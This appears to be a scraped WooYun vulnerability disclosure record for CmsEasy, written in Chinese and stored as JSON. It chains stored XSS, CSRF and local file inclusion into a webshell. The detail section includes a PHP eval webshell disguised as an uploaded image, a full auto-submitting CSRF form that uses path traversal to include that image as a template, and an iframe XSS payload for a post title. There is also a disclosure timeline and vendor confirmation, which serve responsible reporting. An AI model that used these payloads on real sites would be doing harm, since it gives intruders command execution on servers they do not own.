{"id": 60259, "wybug_id": "wooyun-2013-044076", "wybug_title": "CmsEasy 利用xss等漏洞GetShell", "wybug_corp": "cmseasy", "wybug_author": "xfkxfk", "wybug_date": "2013-11-26 15:39", "wybug_open_date": "2014-02-24 15:39", "wybug_type": "文件包含", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "文件包含漏洞", "文件包含漏洞利用技巧", "文件包含漏洞利用", "本地文件包含利用", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-11-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-11-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-11-29：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-01-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-01-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-02-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-02-24：\t细节向公众公开  简要描述： 利用XSS+CSRF+LFI即可从前台直接拿到webshell 详细说明：  \n1、本地文件包含2、存储型XSS3、CSRF4、GetShell这四种漏洞，我们结合利用，拿下站点webshell那就easy了。这里讲一种XSS+CSRF+LFI本地文件包含拿下webshell的过程。XSS+CSRF+LFI=webshell\n第一步，注册会员，然后进入论坛发帖，在帖子中插入一句话图片格式木马。\n\n图片内容如下：\n<?php phpinfo();@eval($_POST['cmd']);?>\n然后右键插件元素，找到上传后图片马的地址，这里图片马的地址是upload/images/201311/138330127188.jpg。第二步，利用后台自定义——添加表单（或者后台模板——添加栏目标签、后台模板——添加内容标签、后台内容——添加内容——属性设置）处的本地文件包含，而且这里的本地文件包含都存在存在CSRF，所以构造好CSRF请求页面。\n\n\n<html><body><form id=\"csrf1\" name=\"csrf\" action=\"http://localhost/cmseasy/index.php?case=form&act=addform&admin_dir=admin&site=default\" method=\"POST\"><input type=\"text\" name=\"cname\" value=\"88888888\" /><input type=\"text\" name=\"name\" value=\"my_88888888\" /><input type=\"text\" name=\"template\" value=\"../../upload/images/201311/138330227201.jpg\" /><input type=\"submit\" name=\"submit\" value=\"%E6%8F%90%E4%BA%A4\" id=\"csrf2\"/></form><script>   document.getElementById(\"csrf2\").click();</script></body></html>\n把此页面放到另外一个站点空间下，如url链接：http://localhost/cmseasy-csrf.html第三步，然后在第一步的帖子标题中插入xss，xss code内容如下：“><iframe src= http://localhost/cmseasy-csrf.html >//src后面的url一定不能加”写好帖子，保存，发布此帖子即可。第四步，当管理员进行帖子管理时，就会触发帖子标题处的xss，发送请求，添加表单，得到webshll。如下如管理员进行帖子管理时，成功添加了表单。\n\n得到的webshell的地址为：http://localhost/cmseasy/index.php?case=form&act=add&form=my_88888888，form的值就是你csrf请求页面里卖弄的name的值，即表单名。菜刀成功连接，得到webshell。\n\n当然利用上面的四种漏洞，还能综合利用，多种方法都能拿到webshell   漏洞证明：  见详细说明   修复方案：  修复xss，csrf，lfi   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2013-11-26 20:04 厂商回复： 感谢  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-03-31 10:25 |    \t\tMody \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:27        | \"><img src=x onerror=alert(1);> <img s...)\t\t \n  组合漏洞，不错，给力阿    \n     2015-03-13 19:19 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  很强大。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}